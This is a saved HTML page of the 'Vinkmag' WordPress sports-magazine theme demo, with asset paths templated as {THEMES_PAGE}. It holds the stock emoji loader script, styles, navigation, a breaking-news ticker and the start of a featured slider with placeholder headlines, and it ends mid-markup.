<!DOCTYPE html>
<!-- saved from url=(0038)http://vinkmag.xpeedstudio.com/sports/ -->
<html lang="en-US">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<title>Sports – Just another Vinkmag site</title>
        <link rel="dns-prefetch" href="http://fonts.googleapis.com/">
        <link rel="dns-prefetch" href="http://s.w.org/">
        <link rel="alternate" type="application/rss+xml" title="Sports » Feed" href="http://vinkmag.xpeedstudio.com/sports/feed/">
        <link rel="alternate" type="application/rss+xml" title="Sports » Comments Feed" href="http://vinkmag.xpeedstudio.com/sports/comments/feed/">
		
        <script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/vinkmag.xpeedstudio.com\/sports\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.9"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55358,56760,9792,65039],[55358,56760,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
	</script>
        
        <script src="{THEMES_PAGE}/assets/js/wp-emoji-release.min.js.download" type="text/javascript" defer=""></script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel="stylesheet" id="apsc-frontend-css-css" href="{THEMES_PAGE}/assets/css/frontend.css" type="text/css" media="all">
<link rel="stylesheet" id="ekit-hf-style-css" href="{THEMES_PAGE}/assets/css/ekit-headerfooter.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-icons-css" href="{THEMES_PAGE}/assets/css/elementor-icons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="font-awesome-css" href="{THEMES_PAGE}/assets/css/font-awesome.min.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-animations-css" href="{THEMES_PAGE}/assets/css/animations.min.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-frontend-css" href="{THEMES_PAGE}/assets/css/frontend.min.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-global-css" href="{THEMES_PAGE}/assets/css/global.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-post-1515-css" href="{THEMES_PAGE}/assets/css/post-1515.css" type="text/css" media="all">
<link rel="stylesheet" id="vinkmag-fonts-css" href="https://fonts.googleapis.com/css?family=Arimo%3A400%2C400i%2C700%2C700i%7CHeebo%3A400%2C500%2C700%2C800%2C900%7CMerriweather%3A400%2C400i%2C700%2C700i%2C900%2C900i&#038;ver=1.2.0" type="text/css" media="all">
<link rel="stylesheet" id="bootstrap-css" href="{THEMES_PAGE}/assets/css/bootstrap.min.css" type="text/css" media="all">
<link rel="stylesheet" id="animate-css" href="{THEMES_PAGE}/assets/css/animate.css" type="text/css" media="all">
<link rel="stylesheet" id="icofonts-css" href="{THEMES_PAGE}/assets/css/icofonts.css" type="text/css" media="all">
<link rel="stylesheet" id="owlcarousel-css" href="{THEMES_PAGE}/assets/css/owlcarousel.min.css" type="text/css" media="all">
<link rel="stylesheet" id="slick-css" href="{THEMES_PAGE}/assets/css/slick.css" type="text/css" media="all">
<link rel="stylesheet" id="jquery-mCustomScrollbar-css" href="{THEMES_PAGE}/assets/css/jquery.mCustomScrollbar.css" type="text/css" media="all">
<link rel="stylesheet" id="magnific-popup-css" href="{THEMES_PAGE}/assets/css/magnific-popup.css" type="text/css" media="all">
<link rel="stylesheet" id="vinkmag-style-css" href="{THEMES_PAGE}/assets/css/style.css" type="text/css" media="all">
<style id="vinkmag-style-inline-css" type="text/css">

        body{ font-style: normal;font-weight:400; }
        h1,h2,h3,h4 { 
            font-family:"Heebo";font-style: normal;font-weight:500;font-size:15px; 
        }

        .nav-menu li a,.post-cat,.post-list-item .nav-tabs li a,.ts-social-list li b,
        .widgets.ts-social-list-item ul li a b,.footer-social li a,.ts-cat-title span,
        .view-link-btn span { 
            font-family:"Heebo";
        }
        .body-inner-content{
          background-color:#f0f1f4 
        }

        /* primary background color*/
        .top-bar .top-social li.ts-date,
        .view-link-btn,
        .logo,
        .navbar-style1.navbar-container .navbar .nav-item a.active, 
        .navbar-style1.navbar-container .navbar .nav-item a:hover, 
        .navbar-style1.navbar-container .navbar .nav-item a:focus,
        .navbar-style1.navbar-container .nav-search-button,
        .ts-title .title-before,
        .owl-dots .owl-dot span,
        #breaking_slider .owl-nav .owl-prev:hover, #breaking_slider .owl-nav .owl-next:hover,
        .navbar-container.navbar-style5 .nav-item a.active:before, 
        .navbar-container.navbar-style5 .nav-item a:hover:before,
         .navbar-container.navbar-style5 .nav-item a:focus:before,
        .ts-newslatter .newsletter-form .ts-submit-btn .btn:hover,
        .top-bar .ts-date-item,
        .header-middle.v2,
        .video-slider .post-video .ts-play-btn,
        .top-social li.ts-subscribe,
        .ts-title.title-bg .title-text,
        .ts-title.title-bg .title-after,
        .ts-widget-newsletter,
        .ts-widget-newsletter .newsletter-form .btn:hover,
        .header-standerd,
        .navbar-container.navbar-style2,
        .navbar-container.navbar-style2 .navbar,
        .navbar-style2.navbar-container .nav-search-button,
        .navbar-container.navbar-style3.navbar-dark .nav-item a.active, .navbar-container.navbar-style3.navbar-dark .nav-item a:hover,
        .navbar-container.navbar-style3.navbar-dark .nav-item a:focus,
        .navbar-standerd.navbar-darks .navbar-style5 .xs-navbar .main-menu > li:hover > a, .navbar-standerd.navbar-darks .navbar-style5 .xs-navbar .main-menu > li.active > a,
        .navbar-standerd.navbar-darks .navbar-style5 .xs-navbar .main-menu > li:before,
        .single-post-wrapper .post-meta-info li.share-post a i,
        .widget-title:before,
        .tagcloud a:hover,
         blockquote cite:after,
        .error-page .error-body a,
        .accordion-post-style .card .btn,
        .navbar-container.navbar-style1 .navbar-nav > .current-menu-parent,
        .widgets-newsletter-form .btn.btn-primary,
        .pagination li.active a, .pagination li:hover a,
        .blog-navbar .navbar-container .navbar .main-menu .nav-item > a.active,
        .blog-navbar .navbar-container.navbar-style5 .main-menu > li.current-menu-item > a:before,
        .blog-navbar .navbar-container .navbar .main-menu .nav-item > a:hover,

        .ts-search-form .vinkmag-serach:before,
        .featured-tab-item .featured-tab-post > li a.active .post-content,
        .featured-tab-item .featured-tab-post > li a.active:before,
        .woocommerce ul.products li.product .button,.woocommerce ul.products li.product .added_to_cart,
        .woocommerce nav.woocommerce-pagination ul li a:focus, .woocommerce nav.woocommerce-pagination ul li a:hover, .woocommerce nav.woocommerce-pagination ul li span.current,
        .woocommerce #respond input#submit.alt, .woocommerce a.button.alt, .woocommerce button.button.alt, .woocommerce input.button.alt,.sponsor-web-link a:hover i, .woocommerce .widget_price_filter .ui-slider .ui-slider-range, .woocommerce span.onsale{
            background-color: #d72924;
        }

        /* primary color*/
        .breaking-title,
        .ts-top-nav li a:hover,
        .post-title a:hover,
        .owl-next,
        .owl-prev,
        .watch-post .post-list-box .post-title:hover,
        a:hover,
        .navbar-container .navbar .nav-item .dropdown-menu .dropdown-item.active, .navbar-container .navbar .nav-item .dropdown-menu .dropdown-item:hover, .navbar-container .navbar .nav-item .dropdown-menu .dropdown-item:focus,
        .ts-overlay-style .overlay-post-content .post-meta-info li.active,
        .navbar-container.navbar-style5 .nav-item a.active, .navbar-container.navbar-style5 .nav-item a:hover, .navbar-container.navbar-style5 .nav-item a:focus,
        .post-meta-info li.active, .post-video .post-video-content .post-meta-info li.active, .navbar-container.navbar-style3 .nav-item a.active, .navbar-container.navbar-style3 .nav-item a:hover, .navbar-container.navbar-style3 .nav-item a:focus, .post-navigation .post-previous:hover span, .post-navigation .post-next:hover span, .breadcrumb li, 
         .woocommerce ul.products li.product .price, .woocommerce ul.products li.product .woocommerce-loop-product__title{
           color: #d72924;
        }

        /* primary dark color*/
        .top-bar.v2,
        .ts-widget-newsletter .newsletter-form .btn,.navbar-container.navbar-style2 .nav-item a.active, .navbar-container.navbar-style2 .nav-item a:hover,
         .navbar-container.navbar-style2 .nav-item a:focus,.widgets-newsletter-form .btn.btn-primary:hover, 
         .woocommerce ul.products li.product .added_to_cart:hover, .woocommerce #respond input#submit.alt:hover, .woocommerce a.button.alt:hover, .woocommerce button.button.alt:hover, .woocommerce input.button.alt:hover,.woocommerce .widget_price_filter .ui-slider .ui-slider-handle{
           background-color: #c2211c;
        }
        .woocommerce ul.products li.product .woocommerce-loop-product__title:hover{
                   color: #c2211c;

        }
        .menu-toggler{
            background-color: #c2211c !important;

        }
        /* border color*/
        .tagcloud a:hover{
           border-color:#d72924;
        }
    
        
</style>
<link rel="stylesheet" id="vinkmag-blog-css" href="{THEMES_PAGE}/assets/css/blog.css" type="text/css" media="all">
<link rel="stylesheet" id="vinkmag-responsive-css" href="{THEMES_PAGE}/assets/css/responsive.css" type="text/css" media="all">
<link rel="stylesheet" id="vinkmag-gutenberg-css" href="{THEMES_PAGE}/assets/css/gutenberg.css" type="text/css" media="all">
<link rel="stylesheet" id="smartmenus-ekit-css" href="{THEMES_PAGE}/assets/css/smartmenus.css" type="text/css" media="all">
<link rel="stylesheet" id="google-fonts-1-css" href="https://fonts.googleapis.com/css?family=Heebo%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CArimo%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;ver=4.9.9" type="text/css" media="all">
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/jquery.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/jquery-migrate.min.js.download"></script>
<link rel="https://api.w.org/" href="http://vinkmag.xpeedstudio.com/sports/wp-json/">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://vinkmag.xpeedstudio.com/sports/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://vinkmag.xpeedstudio.com/sports/wp-includes/wlwmanifest.xml"> 
<meta name="generator" content="WordPress 4.9.9">
<link rel="canonical" href="http://vinkmag.xpeedstudio.com/sports/">
<link rel="shortlink" href="http://vinkmag.xpeedstudio.com/sports/">
<link rel="alternate" type="application/json+oembed" href="http://vinkmag.xpeedstudio.com/sports/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fvinkmag.xpeedstudio.com%2Fsports%2F">
<link rel="alternate" type="text/xml+oembed" href="http://vinkmag.xpeedstudio.com/sports/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fvinkmag.xpeedstudio.com%2Fsports%2F&amp;format=xml">
		<style type="text/css" id="wp-custom-css">
			.navbar-container .navbar .nav-item a,
.post-cat,
.post-list-item .nav-tabs li a,
.ts-social-list li b,
.widgets.ts-social-list-item ul li a b,
.footer-social li a,
.ts-cat-title span,
.view-link-btn span,
.post-navigation a span,
.post-tab-list .post-tag a,
.footer-standard .elementor-widget-wp-widget-recent-posts ul li a{
  font-family: "Heebo", sans-serif;
}


.home .sports-breaking-content .ts-breaking-news p a{
	color: #fff !important;
}
		</style>
	
    
</head>
<body class="home page-template page-template-elementor_header_footer page page-id-1515 ekit-hf-header ekit-hf-footer ekit-hf-template-vinazine ekit-hf-stylesheet-vinazine body-inner-content box-shadow-enebled sidebar-active elementor-default elementor-template-full-width elementor-page elementor-page-1515" data-elementor-device-mode="desktop">
	<div id="preloader" class="hidden loaded">
		<div class="spinner">
			<div class="double-bounce1"></div>
			<div class="double-bounce2"></div>
		</div>
		<div class="preloader-cancel-btn-wraper">
			<a href="http://vinkmag.xpeedstudio.com/sports/" class="btn btn-primary preloader-cancel-btn">
				Cancel Preloader			</a>
		</div>
	</div>
	
			<header id="ekit-header">
					<div data-elementor-type="post" data-elementor-id="4390" class="elementor elementor-4390" data-elementor-settings="[]">
			<div class="elementor-inner">
				<div class="elementor-section-wrap">
							<section data-id="52f1d1a" class="elementor-element elementor-element-52f1d1a sports-breaking-content elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
				<div class="elementor-row">
				<div data-id="0143d5a" class="elementor-element elementor-element-0143d5a elementor-column elementor-col-100 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="1f0fafd" class="elementor-element elementor-element-1f0fafd elementor-hidden-tablet elementor-hidden-phone elementor-hidden-desktop elementor-widget elementor-widget-vinazine-breaking-slider-post" data-element_type="vinazine-breaking-slider-post.default">
				<div class="elementor-widget-container">
			      			<div class="ts-breaking-news media breaking-sliders-item">
					<h2 class="breaking-title">
						<i class="fa fa-bolt"></i> Breaking News :</h2>
					<div class="breaking-news-content owl-carousel media-body vinkmag-breaking-slider owl-loaded">
														
														
														
														
														
														
														
														
														
														
														
														
														
														
											<div class="owl-stage-outer"><div class="owl-stage" style="transform: translate3d(0px, 0px, 0px); transition: all 0s ease 0s;"><div class="owl-item"><div class="breaking-post-content">
									<p>
										<a href="http://vinkmag.xpeedstudio.com/sports/2018/01/04/talent-crisis-gives-aaron-finch-his-test-match-chance/">Talent crisis gives Aaron Finch his Test-match</a>
									</p>
								</div></div><div class="owl-item"><div class="breaking-post-content">
									<p>
										<a href="http://vinkmag.xpeedstudio.com/sports/2018/01/04/how-did-it-go-so-wrong-for-ferrari-in-singapore-2/">How did it go so wrong for Ferrari in Singapore?</a>
									</p>
								</div></div><div class="owl-item"><div class="breaking-post-content">
									<p>
										<a href="http://vinkmag.xpeedstudio.com/sports/2018/01/04/bernard-the-only-positive-everton-crumble-all-over-the-pitch/">Bernard the only positive, Everton crumble all over</a>
									</p>
								</div></div><div class="owl-item"><div class="breaking-post-content">
									<p>
										<a href="http://vinkmag.xpeedstudio.com/sports/2018/01/04/greenough-prison-break-reveal-caused/">Greenough Prison break reveal caused</a>
									</p>
								</div></div><div class="owl-item"><div class="breaking-post-content">
									<p>
										<a href="http://vinkmag.xpeedstudio.com/sports/2019/01/05/vontae-davis-quit-on-the-bills-at-halftime-changed-into/">Vontae Davis Quit on the Bills at Halftime, Changed into</a>
									</p>
								</div></div><div class="owl-item"><div class="breaking-post-content">
									<p>
										<a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/186/">Youth vaping an epidemic with crackdown coming</a>
									</p>
								</div></div><div class="owl-item"><div class="breaking-post-content">
									<p>
										<a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/how-did-it-go-so-wrong-for-ferrari-in-singapore/">How did it go so wrong for Ferrari in Singapore?</a>
									</p>
								</div></div><div class="owl-item"><div class="breaking-post-content">
									<p>
										<a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/the-clock-is-ticking-for-e-cig-companies-underage-users/">The clock is ticking for e-cig companies underage users</a>
									</p>
								</div></div><div class="owl-item"><div class="breaking-post-content">
									<p>
										<a href="http://vinkmag.xpeedstudio.com/sports/2018/08/14/backward-leg-allows-young-cancer-survivor-to-dance-4/">Backward leg allows young cancer survivor to dance</a>
									</p>
								</div></div><div class="owl-item"><div class="breaking-post-content">
									<p>
										<a href="http://vinkmag.xpeedstudio.com/sports/2018/07/14/tesla-just-lost-its-head-of-global-just-finance-2/">Tesla just lost its head of global just finance</a>
									</p>
								</div></div><div class="owl-item"><div class="breaking-post-content">
									<p>
										<a href="http://vinkmag.xpeedstudio.com/sports/2018/04/08/the-clock-is-ticking-for-e-cig-companies-underage-users-2/">Clock is companies underage ticking for e-cig  users</a>
									</p>
								</div></div><div class="owl-item"><div class="breaking-post-content">
									<p>
										<a href="http://vinkmag.xpeedstudio.com/sports/2018/01/14/theyre-back-kennedy-darlingnamed-to-return-to/">They’re back! Kennedy Darling,named to return to</a>
									</p>
								</div></div><div class="owl-item"><div class="breaking-post-content">
									<p>
										<a href="http://vinkmag.xpeedstudio.com/sports/2018/01/07/plans-to-ride-out-hurricane-the-florence-on-a-boat/">plans to ride out Hurricane the Florence on a boat</a>
									</p>
								</div></div><div class="owl-item"><div class="breaking-post-content">
									<p>
										<a href="http://vinkmag.xpeedstudio.com/sports/2017/01/08/theye-back-kennedy-darlings-return/">Theye back return to you Kennedy Darlings</a>
									</p>
								</div></div></div></div><div class="owl-nav"><button role="presentation" class="owl-prev"><span aria-label="prev">‹</span></button><button role="presentation" class="owl-next"><span aria-label="next">›</span></button></div><div class="owl-dots disabled"></div></div>
				</div>

    		</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="d0674be" class="elementor-element elementor-element-d0674be elementor-section-content-middle nav-transparent elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
				<div class="elementor-row">
				<div data-id="67953a7" class="elementor-element elementor-element-67953a7 elementor-column elementor-col-16 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="8c4b726" class="elementor-element elementor-element-8c4b726 elementor-widget elementor-widget-vinazine-logo" data-element_type="vinazine-logo.default">
				<div class="elementor-widget-container">
			    <div class="vinkmag-widget-logo">
        <a href="http://vinkmag.xpeedstudio.com/sports/">
            <img src="{THEMES_PAGE}/assets/images/header_logo.png" alt="Sports">
        </a>
    </div>

    		</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="2283562" class="elementor-element elementor-element-2283562 menu-bg-white elementor-column elementor-col-66 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="50f2178" class="elementor-element elementor-element-50f2178 elementor-widget elementor-widget-ekit-nav-menu" data-element_type="ekit-nav-menu.default">
				<div class="elementor-widget-container">
			<button class="menu-toggler"><span class="menu-toggler-icon"></span></button><div id="ekit-megamenu-main-menu" class="ekit-menu-container ekit-menu-po-left"><ul id="main-menu" class="ekit-menu ekit-menu-simple ekit-menu-init" data-smartmenus-id="15499485175871423"><li id="menu-item-4395" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-1515 current_page_item menu-item-4395 nav-item active"><a href="http://vinkmag.xpeedstudio.com/sports/" class="ekit-menu-nav-link active">Home</a></li>
<li id="menu-item-4396" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4396 nav-item"><a href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" class="ekit-menu-nav-link">Cricket</a></li>
<li id="menu-item-4397" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4397 nav-item"><a href="http://vinkmag.xpeedstudio.com/sports/category/football/" class="ekit-menu-nav-link">Football</a></li>
<li id="menu-item-3828" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3828 nav-item"><a href="http://vinkmag.xpeedstudio.com/sports/category/sports/" class="ekit-menu-nav-link">Sports</a></li>
<li id="menu-item-4398" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-4398 nav-item ekit-menu-dropdown"><a href="http://vinkmag.xpeedstudio.com/sports/#" class="ekit-menu-nav-link ekit-menu-dropdown-toggle has-submenu" id="ekit-menu-15499485175871423-1" aria-haspopup="true" aria-controls="ekit-menu-15499485175871423-2" aria-expanded="false">Features<span class="sub-arrow"></span></a>
<ul class="ekit-has-submenu" id="ekit-menu-15499485175871423-2" role="group" aria-hidden="true" aria-labelledby="ekit-menu-15499485175871423-1" aria-expanded="false">
	<li id="menu-item-4401" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-4401 nav-item ekit-menu-dropdown"><a href="http://vinkmag.xpeedstudio.com/sports/#" class="dropdown-item has-submenu" id="ekit-menu-15499485175871423-3" aria-haspopup="true" aria-controls="ekit-menu-15499485175871423-4" aria-expanded="false">Category Layout<span class="sub-arrow"></span></a>
	<ul class="ekit-has-submenu" id="ekit-menu-15499485175871423-4" role="group" aria-hidden="true" aria-labelledby="ekit-menu-15499485175871423-3" aria-expanded="false">
		<li id="menu-item-4405" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4405 nav-item"><a href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" class=" dropdown-item">Category Style 1</a>		</li><li id="menu-item-4406" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4406 nav-item"><a href="http://vinkmag.xpeedstudio.com/sports/category/sketing/" class=" dropdown-item">Category Style 2</a>	</li></ul>
	</li><li id="menu-item-4402" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-4402 nav-item ekit-menu-dropdown"><a href="http://vinkmag.xpeedstudio.com/sports/#" class="dropdown-item has-submenu" id="ekit-menu-15499485175871423-5" aria-haspopup="true" aria-controls="ekit-menu-15499485175871423-6" aria-expanded="false">Post Formats<span class="sub-arrow"></span></a>
	<ul class="ekit-has-submenu" id="ekit-menu-15499485175871423-6" role="group" aria-hidden="true" aria-labelledby="ekit-menu-15499485175871423-5" aria-expanded="false">
		<li id="menu-item-4403" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-4403 nav-item"><a href="http://vinkmag.xpeedstudio.com/sports/2019/01/11/martavis-bryant-is-way-higher-on-jon-gruden-than-gruden-is-on-bryant/" class=" dropdown-item">Post Style 1</a>		</li><li id="menu-item-4404" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-4404 nav-item"><a href="http://vinkmag.xpeedstudio.com/sports/2019/01/05/vontae-davis-quit-on-the-bills-at-halftime-changed-into/" class=" dropdown-item">Pot Style 2</a>	</li></ul>
	</li><li id="menu-item-4407" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-4407 nav-item ekit-menu-dropdown"><a href="http://vinkmag.xpeedstudio.com/sports/#" class="dropdown-item has-submenu" id="ekit-menu-15499485175871423-7" aria-haspopup="true" aria-controls="ekit-menu-15499485175871423-8" aria-expanded="false">Pages<span class="sub-arrow"></span></a>
	<ul class="ekit-has-submenu" id="ekit-menu-15499485175871423-8" role="group" aria-hidden="true" aria-labelledby="ekit-menu-15499485175871423-7" aria-expanded="false">
		<li id="menu-item-4408" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4408 nav-item"><a href="http://vinkmag.xpeedstudio.com/sports/author/vinkmag/" class=" dropdown-item">Author</a>		</li><li id="menu-item-4409" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4409 nav-item"><a href="http://vinkmag.xpeedstudio.com/sports/pagenotfound" class=" dropdown-item">404</a>	</li></ul>
</li></ul>
</li>
</ul>
        <div class="nav-identity-panel">
            <button class="menu-close" type="button">X</button>
        </div>
        </div><div class="ekit-menu-overlay"></div>		</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="01073e8" class="elementor-element elementor-element-01073e8 elementor-column elementor-col-16 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="8945c4f" class="elementor-element elementor-element-8945c4f elementor-hidden-tablet elementor-hidden-phone elementor-widget elementor-widget-vinazine-nav-search" data-element_type="vinazine-nav-search.default">
				<div class="elementor-widget-container">
			        <div class="header-search-icon">
           
            <a href="http://vinkmag.xpeedstudio.com/sports/#modal-popup-2" class="navsearch-button nav-search-button xs-modal-popup"><i class="icon icon-search"></i></a>
        </div>
 

            	<!-- xs modal -->
<div class="zoom-anim-dialog mfp-hide modal-searchPanel ts-search-form" id="modal-popup-2">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="xs-search-panel">
                  
	<form method="get" action="http://vinkmag.xpeedstudio.com/sports/" class="vinkmag-serach">
		<div class="input-group">
			<input class="form-control text-center" type="search" name="s" placeholder="Type and hit ENTER" value="">
			<div class="input-group-append">
				<span class="nav-search-close-button header-search-btn-toggle d-none" tabindex="0">✕</span>
			</div>
		</div>
	</form>
	            </div>
        </div>
    </div>
</div><!-- End xs modal --><!-- end language switcher strart -->
    		</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
				</header>

	
   		<div data-elementor-type="post" data-elementor-id="1515" class="elementor elementor-1515" data-elementor-settings="[]">
			<div class="elementor-inner">
				<div class="elementor-section-wrap">
							<section data-id="07ca19b" class="elementor-element elementor-element-07ca19b elementor-section-full_width elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-settings="{&quot;background_background&quot;:&quot;gradient&quot;}" data-element_type="section">
						<div class="elementor-container elementor-column-gap-no">
				<div class="elementor-row">
				<div data-id="bb22729" class="elementor-element elementor-element-bb22729 elementor-column elementor-col-100 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="1d60ef4" class="elementor-element elementor-element-1d60ef4 elementor-widget elementor-widget-vinazine-home-featured-slider" data-element_type="vinazine-home-featured-slider.default">
				<div class="elementor-widget-container">
			
                <div data-autoplay="yes" class="grid-slider vinazine-featured-post owl-carousel hero-slider owl-loaded owl-drag">
                    
                        

                
                        

                
                        

                
                        

                                <div class="owl-stage-outer"><div class="owl-stage" style="transform: translate3d(-7652px, 0px, 0px); transition: all 0s ease 0s; width: 15304px;"><div class="owl-item cloned" style="width: 1903px; margin-right: 10px;"><div class="featured-slider-item" style="background-image: url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/featured3.png)">
                            <div class="featured-table">
                                <div class="table-cell">
                                    <div class="container">
                                        <div class="row">
                                            <div class="col-lg-6">
                                                <div class="hero-content">
                                                 
                                                                                                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/feature/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
                                                        Racing                                                    </a>
                                                                                              
                                                    <h2 class="hero-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/04/bernard-the-only-positive-everton-crumble-all-over-the-pitch/">
                                                        Bernard the only positive, Everton crumble all over                                                        </a>
                                                    </h2>
                                                    <p>
                                                        Black farmers in the US’s South—&nbsp;faced with continued failure their efforts to run successful farms&nbsp;their…                                                    </p>
                                                </div>
                                            </div>
                                            <!-- col end-->
                                        </div>
                                        <!-- row end-->
                                    </div>
                                    <!-- container end-->
                                </div>
                            </div>
                        </div></div><div class="owl-item cloned" style="width: 1903px; margin-right: 10px;"><div class="featured-slider-item" style="background-image: url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/featured2.png)">
                            <div class="featured-table">
                                <div class="table-cell">
                                    <div class="container">
                                        <div class="row">
                                            <div class="col-lg-6">
                                                <div class="hero-content">
                                                 
                                                                                                        <a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/feature/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
                                                        Racing                                                    </a>
                                                                                              
                                                    <h2 class="hero-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/01/04/greenough-prison-break-reveal-caused/">
                                                        Greenough Prison break reveal caused                                                        </a>
                                                    </h2>
                                                    <p>
                                                        Black farmers in the US’s South—&nbsp;faced with continued failure their efforts to run successful farms&nbsp;their…                                                    </p>
                                                </div>
                                            </div>
                                            <!-- col end-->
                                        </div>
                                        <!-- row end-->
                                    </div>
                                    <!-- container end-->
                                </div>
                            </div>
                        </div></div><div class="owl-item" style="width: 1903px; margin-right: 10px;"><div class="featured-slider-item" style="background-image: url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/featured1.png)">
                            <div class="featured-table">
                                <div class="table-cell">
                                    <div class="container">
                                        <div class="row">
                                            <div class="col-lg-6">
                                                <div class="hero-content">
                                                 
